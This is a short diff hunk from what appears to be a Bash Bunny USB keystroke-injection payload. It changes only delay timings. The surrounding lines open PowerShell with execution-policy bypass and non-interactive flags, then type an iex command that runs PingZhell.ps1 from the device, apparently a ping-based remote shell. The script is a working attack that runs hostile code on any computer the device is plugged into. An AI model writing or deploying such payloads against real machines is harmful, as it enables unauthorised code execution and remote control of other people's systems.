@@ -28,11 +28,11 @@ RUN WIN "powershell -Exec Bypass -NoP -NonI"
 DELAY 6000
 Q ENTER
 
-DELAY 10000
+DELAY 20000
 Q STRING "iex((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\PingZhell.ps1')"
 DELAY 20000
 Q ENTER
-DELAY 10000
+DELAY 15000
 
 ATTACKMODE HID
 
